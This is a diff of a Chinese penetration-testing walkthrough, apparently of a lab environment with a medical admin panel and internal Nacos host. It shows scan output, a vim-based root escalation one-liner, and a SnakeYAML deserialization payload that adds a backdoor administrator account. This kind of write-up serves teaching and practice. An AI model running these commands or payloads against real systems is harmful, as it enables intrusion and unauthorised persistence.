@@ -17,20 +17,20 @@ Tags
 :::
 
 ```plaintext title="入口点"
-39.98.116.141
+39.98.119.158
 ```
 
 ## 入口点探测
 
 ```plaintext
 start infoscan
-39.98.116.141:22 open
-39.98.116.141:8080 open
+39.98.119.158:22 open
+39.98.119.158:8080 open
 [*] alive ports len is: 2
 start vulscan
-[*] WebTitle http://39.98.116.141:8080 code:302 len:0      title:None 跳转 url: http://39.98.116.141:8080/login;jsessionid=F56DD760EA13EF7948D3B0BE8D1372C4
-[*] WebTitle http://39.98.116.141:8080/login;jsessionid=F56DD760EA13EF7948D3B0BE8D1372C4 code:200 len:2005   title: 医疗管理后台
-[+] PocScan http://39.98.116.141:8080 poc-yaml-spring-actuator-heapdump-file
+[*] WebTitle http://39.98.119.158:8080 code:302 len:0      title:None 跳转 url: http://39.98.119.158:8080/login;jsessionid=F56DD760EA13EF7948D3B0BE8D1372C4
+[*] WebTitle http://39.98.119.158:8080/login;jsessionid=F56DD760EA13EF7948D3B0BE8D1372C4 code:200 len:2005   title: 医疗管理后台
+[+] PocScan http://39.98.119.158:8080 poc-yaml-spring-actuator-heapdump-file
 ```
 
 扫一下目录
@@ -128,7 +128,7 @@ Vulnerable to CVE-2021-3560
 
 参考 [vim | GTFOBins](https://gtfobins.github.io/gtfobins/vim/)
 
-最终成功得到root权限
+最终成功得到 root 权限
 
 ```bash
 (remote) app@web01:/tmp$ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
@@ -173,7 +173,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-使用fscan进行扫描
+使用 fscan 进行扫描
 
 ```bash
 start infoscan
@@ -227,29 +227,37 @@ root@jmt-projekt:~# ./tools/chisel_1.10.1/chisel_1.10.1_linux_amd64 server -p 91
 
 ## 172.30.12.6 Nacos
 
-直接使用[charonlight/NacosExploitGUI: Nacos漏洞综合利用GUI工具](https://github.com/charonlight/NacosExploitGUI)进行利用
+首先注意到，存在有一条 config
+
+![img](img/image_20260238-223844.png)
+
+直接使用 [charonlight/NacosExploitGUI: Nacos 漏洞综合利用 GUI 工具](https://github.com/charonlight/NacosExploitGUI)进行利用
 
 ![img](img/image_20250135-223518.png)
 
-尝试进行yaml反序列化，使用[artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads](https://github.com/artsploit/yaml-payload)
+尝试进行 yaml 反序列化，使用 [artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads](https://github.com/artsploit/yaml-payload)
 
 ```java
-Runtime.getRuntime().exec("net user randark randark 123 /add");
+Runtime.getRuntime().exec("net user randark randark123### /add");
 Runtime.getRuntime().exec("net localgroup Administrators randark /add");
 ```
 
-编译jar包
+编译 jar 包
 
 ```bash
-PS D:\_Exps\yaml-payload> javac src/artsploit/AwesomeScriptEngineFactory.java
-PS D:\_Exps\yaml-payload> jar -cvf exp.jar -C src/ .         
+PS D:\_Exps\yaml-payload> & 'C:\Program Files\Java\jdk-11.0.30\bin\javac.exe' .\src\artsploit\AwesomeScriptEngineFactory.java
+PS D:\_Exps\yaml-payload> & 'C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe' -cvf exp.jar -C src/ .
 已添加清单
 正在添加: artsploit/(输入 = 0) (输出 = 0)(存储了 0%)
-正在添加: artsploit/AwesomeScriptEngineFactory.class(输入 = 1686) (输出 = 711)(压缩了 57%)
-正在添加: artsploit/AwesomeScriptEngineFactory.java(输入 = 1655) (输出 = 424)(压缩了 74%)
+正在添加: artsploit/AwesomeScriptEngineFactory.class(输入 = 1683) (输出 = 714)(压缩了 57%)
+正在添加: artsploit/AwesomeScriptEngineFactory.java(输入 = 1658) (输出 = 428)(压缩了 74%)
 正在忽略条目META-INF/
 正在添加: META-INF/services/(输入 = 0) (输出 = 0)(存储了 0%)
 正在添加: META-INF/services/javax.script.ScriptEngineFactory(输入 = 36) (输出 = 38)(压缩了 -5%)
 ```
 
+需要注意的是，这一台机器不出网，所以需要先传到 **web01** 机器上再进行传输
+
 ![img](img/image_20250150-225046.png)
+
+这环境跟我八字不合，打一次坏一次哈哈哈
